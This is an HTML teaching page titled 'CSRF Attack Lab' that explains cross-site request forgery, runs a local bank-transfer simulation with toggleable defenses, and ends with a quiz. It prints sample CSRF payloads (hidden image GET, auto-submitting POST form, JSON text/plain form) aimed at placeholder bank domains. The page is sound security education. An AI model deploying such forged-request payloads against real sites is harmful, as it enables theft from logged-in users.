<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Attack Lab - Dark Arts Vault | Hexworth Prime</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a1a 100%);
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: linear-gradient(135deg, #1a0a1a 0%, #2a0a2a 100%);
            border: 2px solid #a855f7;
            border-radius: 10px;
            box-shadow: 0 0 30px rgba(168, 85, 247, 0.3);
        }

        h1 {
            color: #a855f7;
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 0 0 10px rgba(168, 85, 247, 0.5);
        }

        .subtitle {
            color: #dc2626;
            font-size: 1.2em;
            margin-bottom: 20px;
        }

        .back-link {
            display: inline-block;
            color: #a855f7;
            text-decoration: none;
            padding: 10px 20px;
            border: 1px solid #a855f7;
            border-radius: 5px;
            transition: all 0.3s;
            margin-top: 15px;
        }

        .back-link:hover {
            background: #a855f7;
            color: #000;
        }

        .ethical-warning {
            background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%);
            border: 2px solid #fca5a5;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            box-shadow: 0 0 20px rgba(220, 38, 38, 0.3);
        }

        .ethical-warning h3 {
            color: #fca5a5;
            margin-bottom: 10px;
            font-size: 1.3em;
        }

        .ethical-warning p {
            color: #fef2f2;
            line-height: 1.6;
        }

        .section {
            background: rgba(30, 10, 40, 0.6);
            border: 1px solid #a855f7;
            border-radius: 10px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }

        .section h2 {
            color: #a855f7;
            margin-bottom: 20px;
            font-size: 1.8em;
            border-bottom: 2px solid #a855f7;
            padding-bottom: 10px;
        }

        .section h3 {
            color: #c084fc;
            margin-top: 25px;
            margin-bottom: 15px;
            font-size: 1.3em;
        }

        .section p, .section li {
            line-height: 1.8;
            color: #d1d5db;
            margin-bottom: 10px;
        }

        .section ul {
            margin-left: 20px;
            margin-bottom: 20px;
        }

        code {
            background: #1a0a2a;
            color: #10b981;
            padding: 2px 8px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
        }

        pre {
            background: #0a0a1a;
            border: 1px solid #a855f7;
            border-radius: 8px;
            padding: 20px;
            overflow-x: auto;
            margin: 15px 0;
            font-size: 0.9em;
            line-height: 1.6;
        }

        pre code {
            background: none;
            padding: 0;
        }

        .attack-phase {
            border-left: 4px solid #a855f7;
            padding-left: 20px;
            margin: 20px 0;
        }

        .phase-number {
            display: inline-block;
            width: 30px;
            height: 30px;
            background: #a855f7;
            color: #000;
            text-align: center;
            line-height: 30px;
            border-radius: 50%;
            font-weight: bold;
            margin-right: 10px;
        }

        /* Interactive Lab */
        .lab-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-top: 20px;
        }

        .lab-panel {
            background: rgba(10, 10, 20, 0.8);
            border: 1px solid #a855f7;
            border-radius: 8px;
            overflow: hidden;
        }

        .lab-panel-header {
            background: rgba(168, 85, 247, 0.2);
            padding: 12px 15px;
            border-bottom: 1px solid #a855f7;
            font-weight: bold;
            color: #c084fc;
        }

        .lab-panel-content {
            padding: 20px;
        }

        /* Victim Bank Simulator */
        .bank-app {
            background: linear-gradient(135deg, #1e3a5f 0%, #0f1f35 100%);
            border: 1px solid #3b82f6;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 15px;
        }

        .bank-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(59, 130, 246, 0.3);
        }

        .bank-logo {
            color: #3b82f6;
            font-weight: bold;
            font-size: 1.2em;
        }

        .bank-user {
            color: #60a5fa;
            font-size: 0.9em;
        }

        .bank-balance {
            text-align: center;
            padding: 20px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            margin-bottom: 15px;
        }

        .balance-label {
            font-size: 0.8em;
            color: #9ca3af;
            margin-bottom: 5px;
        }

        .balance-amount {
            font-size: 2em;
            color: #10b981;
            font-weight: bold;
        }

        .bank-form {
            display: grid;
            gap: 10px;
        }

        .bank-form label {
            font-size: 0.85em;
            color: #9ca3af;
        }

        .bank-form input {
            padding: 10px;
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(59, 130, 246, 0.3);
            border-radius: 4px;
            color: #e0e0e0;
            font-family: inherit;
        }

        .bank-form input:focus {
            outline: none;
            border-color: #3b82f6;
        }

        .bank-submit {
            padding: 12px;
            background: linear-gradient(135deg, #3b82f6, #1d4ed8);
            border: none;
            border-radius: 4px;
            color: white;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }

        .bank-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4);
        }

        /* Attacker Panel */
        .attacker-form textarea {
            width: 100%;
            min-height: 150px;
            padding: 12px;
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid #a855f7;
            border-radius: 4px;
            color: #10b981;
            font-family: 'Courier New', monospace;
            font-size: 0.85em;
            resize: vertical;
        }

        .attacker-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #dc2626, #991b1b);
            border: none;
            border-radius: 4px;
            color: white;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
            transition: all 0.3s;
        }

        .attacker-btn:hover {
            box-shadow: 0 0 20px rgba(220, 38, 38, 0.5);
        }

        /* Event Log */
        .event-log {
            background: #0a0a0a;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 15px;
            max-height: 200px;
            overflow-y: auto;
            font-size: 0.85em;
            margin-top: 20px;
        }

        .log-entry {
            padding: 5px 0;
            border-bottom: 1px solid #222;
        }

        .log-entry.attack { color: #ef4444; }
        .log-entry.success { color: #10b981; }
        .log-entry.info { color: #3b82f6; }
        .log-entry.warning { color: #f59e0b; }

        .log-time {
            color: #6b7280;
            margin-right: 10px;
        }

        /* Defense Panel */
        .defense-option {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 6px;
            margin-bottom: 10px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .defense-option:hover {
            background: rgba(168, 85, 247, 0.1);
        }

        .defense-option input[type="checkbox"] {
            width: 18px;
            height: 18px;
            accent-color: #a855f7;
        }

        .defense-label {
            flex: 1;
        }

        .defense-label strong {
            display: block;
            color: #c084fc;
            margin-bottom: 3px;
        }

        .defense-label span {
            font-size: 0.8em;
            color: #9ca3af;
        }

        .indicator {
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 0.75em;
            font-weight: bold;
        }

        .indicator.enabled {
            background: rgba(16, 185, 129, 0.2);
            color: #10b981;
        }

        .indicator.disabled {
            background: rgba(239, 68, 68, 0.2);
            color: #ef4444;
        }

        /* Quiz Section */
        .quiz-question {
            background: rgba(0, 0, 0, 0.3);
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
        }

        .quiz-question h4 {
            color: #c084fc;
            margin-bottom: 15px;
        }

        .quiz-option {
            display: block;
            padding: 12px 15px;
            margin: 8px 0;
            background: rgba(168, 85, 247, 0.1);
            border: 1px solid rgba(168, 85, 247, 0.3);
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .quiz-option:hover {
            background: rgba(168, 85, 247, 0.2);
        }

        .quiz-option.selected {
            border-color: #a855f7;
            box-shadow: 0 0 10px rgba(168, 85, 247, 0.3);
        }

        .quiz-option.correct {
            background: rgba(16, 185, 129, 0.2);
            border-color: #10b981;
        }

        .quiz-option.incorrect {
            background: rgba(239, 68, 68, 0.2);
            border-color: #ef4444;
        }

        @media (max-width: 768px) {
            .lab-container {
                grid-template-columns: 1fr;
            }

            h1 {
                font-size: 1.8em;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>CSRF Attack Lab</h1>
            <p class="subtitle">Cross-Site Request Forgery</p>
            <a href="index.html" class="back-link">Back to Vault</a>
        </header>

        <div class="ethical-warning">
            <h3>Educational Purpose Only</h3>
            <p>This lab demonstrates CSRF attacks for educational purposes. Only test these techniques on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal and unethical. Understanding these attacks helps build better defenses.</p>
        </div>

        <!-- Theory Section -->
        <div class="section">
            <h2>Understanding CSRF</h2>
            <p>Cross-Site Request Forgery (CSRF) is an attack that forces authenticated users to perform unintended actions on a web application. Unlike XSS (which exploits trust in a website), CSRF exploits the trust that a website has in a user's browser.</p>

            <h3>How CSRF Works</h3>
            <div class="attack-phase">
                <p><span class="phase-number">1</span> <strong>Victim logs into target site</strong> - User authenticates and receives a session cookie</p>
            </div>
            <div class="attack-phase">
                <p><span class="phase-number">2</span> <strong>Attacker crafts malicious page</strong> - Creates HTML/JS that makes a request to target site</p>
            </div>
            <div class="attack-phase">
                <p><span class="phase-number">3</span> <strong>Victim visits attacker's page</strong> - Could be via phishing, malicious ad, or XSS</p>
            </div>
            <div class="attack-phase">
                <p><span class="phase-number">4</span> <strong>Browser sends forged request</strong> - Includes victim's session cookie automatically</p>
            </div>
            <div class="attack-phase">
                <p><span class="phase-number">5</span> <strong>Server executes action</strong> - Believes request is legitimate because session is valid</p>
            </div>

            <h3>Why It Works</h3>
            <ul>
                <li>Browsers automatically attach cookies to requests matching the cookie's domain</li>
                <li>The server cannot distinguish between legitimate and forged requests</li>
                <li>Same-origin policy only prevents reading responses, not sending requests</li>
            </ul>
        </div>

        <!-- Interactive Lab -->
        <div class="section">
            <h2>Interactive Attack Simulation</h2>
            <p>This simulation demonstrates how a CSRF attack works. The "victim" is logged into their bank, and the attacker attempts to transfer money without their knowledge.</p>

            <div class="lab-container">
                <!-- Victim's Bank -->
                <div class="lab-panel">
                    <div class="lab-panel-header">Victim's Browser - SecureBank</div>
                    <div class="lab-panel-content">
                        <div class="bank-app">
                            <div class="bank-header">
                                <span class="bank-logo">SecureBank</span>
                                <span class="bank-user">Welcome, Alice</span>
                            </div>
                            <div class="bank-balance">
                                <div class="balance-label">Account Balance</div>
                                <div class="balance-amount" id="victimBalance">$10,000.00</div>
                            </div>
                            <div class="bank-form">
                                <label>Transfer To (Account #)</label>
                                <input type="text" id="transferTo" placeholder="Enter account number">
                                <label>Amount ($)</label>
                                <input type="number" id="transferAmount" placeholder="0.00">
                                <button class="bank-submit" onclick="legitimateTransfer()">Transfer Funds</button>
                            </div>
                        </div>
                        <p style="font-size: 0.8em; color: #9ca3af;">Session: Active | Cookie: session=abc123xyz</p>
                    </div>
                </div>

                <!-- Attacker's Panel -->
                <div class="lab-panel">
                    <div class="lab-panel-header" style="background: rgba(220, 38, 38, 0.2); border-color: #dc2626;">Attacker's Malicious Page</div>
                    <div class="lab-panel-content">
                        <p style="margin-bottom: 10px; font-size: 0.9em;">Craft a hidden form that submits to the bank:</p>
                        <div class="attacker-form">
                            <textarea id="csrfPayload">&lt;!-- Hidden CSRF Attack --&gt;
&lt;img src="https://securebank.com/transfer?to=ATTACKER&amount=5000" style="display:none"&gt;

&lt;!-- Or using auto-submit form --&gt;
&lt;form id="csrfForm" action="https://securebank.com/transfer" method="POST"&gt;
  &lt;input type="hidden" name="to" value="ATTACKER-ACCT"&gt;
  &lt;input type="hidden" name="amount" value="5000"&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById('csrfForm').submit();&lt;/script&gt;</textarea>
                            <button class="attacker-btn" onclick="executeCSRF()">Execute CSRF Attack</button>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Event Log -->
            <div class="event-log" id="eventLog">
                <div class="log-entry info"><span class="log-time">[00:00:00]</span> Lab initialized. Victim is logged in with valid session.</div>
            </div>
        </div>

        <!-- Defense Mechanisms -->
        <div class="section">
            <h2>Defense Mechanisms</h2>
            <p>Enable defenses to see how they prevent CSRF attacks:</p>

            <div class="defense-option" onclick="toggleDefense('csrfToken')">
                <input type="checkbox" id="csrfToken">
                <div class="defense-label">
                    <strong>CSRF Tokens (Synchronizer Token Pattern)</strong>
                    <span>Include a unique, unpredictable token in each form that the server validates</span>
                </div>
                <span class="indicator disabled" id="csrfTokenStatus">OFF</span>
            </div>

            <div class="defense-option" onclick="toggleDefense('sameSite')">
                <input type="checkbox" id="sameSite">
                <div class="defense-label">
                    <strong>SameSite Cookie Attribute</strong>
                    <span>Set SameSite=Strict or Lax to prevent cookies from being sent with cross-site requests</span>
                </div>
                <span class="indicator disabled" id="sameSiteStatus">OFF</span>
            </div>

            <div class="defense-option" onclick="toggleDefense('referer')">
                <input type="checkbox" id="referer">
                <div class="defense-label">
                    <strong>Referer Header Validation</strong>
                    <span>Check that requests originate from the same domain</span>
                </div>
                <span class="indicator disabled" id="refererStatus">OFF</span>
            </div>

            <div class="defense-option" onclick="toggleDefense('doubleSubmit')">
                <input type="checkbox" id="doubleSubmit">
                <div class="defense-label">
                    <strong>Double Submit Cookie</strong>
                    <span>Send token in both cookie and request body - attacker can't read cookie value</span>
                </div>
                <span class="indicator disabled" id="doubleSubmitStatus">OFF</span>
            </div>

            <h3>CSRF Token Example</h3>
            <pre><code>&lt;!-- Server generates unique token per session/request --&gt;
&lt;form action="/transfer" method="POST"&gt;
  &lt;input type="hidden" name="csrf_token"
         value="a8f3k2n5x9m1p7q4"&gt;
  &lt;input name="to" placeholder="Account"&gt;
  &lt;input name="amount" placeholder="Amount"&gt;
  &lt;button type="submit"&gt;Transfer&lt;/button&gt;
&lt;/form&gt;

// Server-side validation
if (request.csrf_token !== session.csrf_token) {
    return error(403, "CSRF token mismatch");
}</code></pre>
        </div>

        <!-- Attack Variations -->
        <div class="section">
            <h2>CSRF Attack Variations</h2>

            <h3>GET-Based CSRF</h3>
            <p>The simplest form - if state-changing actions use GET requests:</p>
            <pre><code>&lt;!-- Image tag (invisible) --&gt;
&lt;img src="https://bank.com/transfer?to=attacker&amount=1000" width="0" height="0"&gt;

&lt;!-- Or disguised as a link --&gt;
&lt;a href="https://bank.com/transfer?to=attacker&amount=1000"&gt;
  Click here for free prize!
&lt;/a&gt;</code></pre>

            <h3>POST-Based CSRF</h3>
            <p>Auto-submitting form when victim loads the page:</p>
            <pre><code>&lt;body onload="document.getElementById('csrf').submit()"&gt;
  &lt;form id="csrf" method="POST" action="https://bank.com/transfer"&gt;
    &lt;input type="hidden" name="to" value="attacker"&gt;
    &lt;input type="hidden" name="amount" value="1000"&gt;
  &lt;/form&gt;
&lt;/body&gt;</code></pre>

            <h3>JSON CSRF</h3>
            <p>Attacking APIs that accept JSON (if CORS is misconfigured):</p>
            <pre><code>&lt;form id="csrf" method="POST" action="https://api.bank.com/transfer"
      enctype="text/plain"&gt;
  &lt;input name='{"to":"attacker","amount":1000,"ignore":"' value='"}' type="hidden"&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;</code></pre>
        </div>

        <!-- Quiz Section -->
        <div class="section">
            <h2>Knowledge Check</h2>

            <div class="quiz-question">
                <h4>1. What distinguishes CSRF from XSS?</h4>
                <div class="quiz-option" onclick="checkAnswer(this, true)">A) CSRF exploits the trust a site has in the user's browser; XSS exploits user trust in a site</div>
                <div class="quiz-option" onclick="checkAnswer(this, false)">B) CSRF requires JavaScript; XSS does not</div>
                <div class="quiz-option" onclick="checkAnswer(this, false)">C) CSRF works on GET requests only; XSS works on POST</div>
                <div class="quiz-option" onclick="checkAnswer(this, false)">D) There is no difference</div>
            </div>

            <div class="quiz-question">
                <h4>2. Why doesn't Same-Origin Policy prevent CSRF?</h4>
                <div class="quiz-option" onclick="checkAnswer(this, false)">A) Same-Origin Policy doesn't apply to cookies</div>
                <div class="quiz-option" onclick="checkAnswer(this, true)">B) Same-Origin Policy prevents reading responses, not sending requests</div>
                <div class="quiz-option" onclick="checkAnswer(this, false)">C) Same-Origin Policy only applies to JavaScript</div>
                <div class="quiz-option" onclick="checkAnswer(this, false)">D) Same-Origin Policy is disabled by default</div>
            </div>

            <div class="quiz-question">
                <h4>3. What is the most effective defense against CSRF?</h4>
                <div class="quiz-option" onclick="checkAnswer(this, false)">A) Input validation</div>
                <div class="quiz-option" onclick="checkAnswer(this, false)">B) HTTPS</div>
                <div class="quiz-option" onclick="checkAnswer(this, true)">C) Anti-CSRF tokens</div>
                <div class="quiz-option" onclick="checkAnswer(this, false)">D) Rate limiting</div>
            </div>
        </div>
    </div>

    <script>
        let victimBalance = 10000;
        let defenses = {
            csrfToken: false,
            sameSite: false,
            referer: false,
            doubleSubmit: false
        };

        function log(message, type = 'info') {
            const logDiv = document.getElementById('eventLog');
            const time = new Date().toLocaleTimeString();
            const entry = document.createElement('div');
            entry.className = `log-entry ${type}`;
            entry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        function updateBalance() {
            document.getElementById('victimBalance').textContent = `$${victimBalance.toLocaleString()}.00`;
        }

        function legitimateTransfer() {
            const to = document.getElementById('transferTo').value;
            const amount = parseFloat(document.getElementById('transferAmount').value);

            if (!to || !amount || amount <= 0) {
                log('Transfer failed: Invalid input', 'warning');
                return;
            }

            if (amount > victimBalance) {
                log('Transfer failed: Insufficient funds', 'warning');
                return;
            }

            victimBalance -= amount;
            updateBalance();
            log(`Legitimate transfer: $${amount} sent to ${to}`, 'success');
            document.getElementById('transferTo').value = '';
            document.getElementById('transferAmount').value = '';
        }

        function executeCSRF() {
            log('Attacker page loaded by victim...', 'attack');
            log('Hidden form auto-submitting...', 'attack');

            // Check defenses
            if (defenses.csrfToken) {
                log('BLOCKED: CSRF token missing/invalid!', 'success');
                log('Attack prevented by anti-CSRF token', 'success');
                return;
            }

            if (defenses.sameSite) {
                log('BLOCKED: SameSite cookie not sent!', 'success');
                log('Attack prevented by SameSite cookie attribute', 'success');
                return;
            }

            if (defenses.referer) {
                log('BLOCKED: Referer header mismatch!', 'success');
                log('Attack prevented by referer validation', 'success');
                return;
            }

            if (defenses.doubleSubmit) {
                log('BLOCKED: Double-submit cookie mismatch!', 'success');
                log('Attack prevented by double-submit cookie pattern', 'success');
                return;
            }

            // Attack succeeds
            log('Browser attached session cookie automatically', 'attack');
            log('Server received request with valid session', 'attack');

            const stolenAmount = 5000;
            if (victimBalance >= stolenAmount) {
                victimBalance -= stolenAmount;
                updateBalance();
                log(`CSRF ATTACK SUCCESSFUL! $${stolenAmount} transferred to attacker!`, 'attack');
            } else {
                log('Attack failed: Insufficient victim funds', 'warning');
            }
        }

        function toggleDefense(defense) {
            defenses[defense] = !defenses[defense];
            const checkbox = document.getElementById(defense);
            const status = document.getElementById(defense + 'Status');

            checkbox.checked = defenses[defense];
            status.textContent = defenses[defense] ? 'ON' : 'OFF';
            status.className = `indicator ${defenses[defense] ? 'enabled' : 'disabled'}`;

            log(`Defense "${defense}" ${defenses[defense] ? 'ENABLED' : 'DISABLED'}`, 'info');
        }

        function checkAnswer(element, isCorrect) {
            const options = element.parentElement.querySelectorAll('.quiz-option');
            options.forEach(opt => {
                opt.classList.remove('selected', 'correct', 'incorrect');
            });

            element.classList.add('selected');
            element.classList.add(isCorrect ? 'correct' : 'incorrect');

            if (!isCorrect) {
                options.forEach(opt => {
                    if (opt.onclick.toString().includes('true')) {
                        opt.classList.add('correct');
                    }
                });
            }
        }

        // Console message
        console.log('%c CSRF Attack Lab', 'color: #a855f7; font-size: 14px;');
        console.log('%c Educational Purpose Only', 'color: #dc2626; font-size: 10px;');
    </script>
</body>
</html>
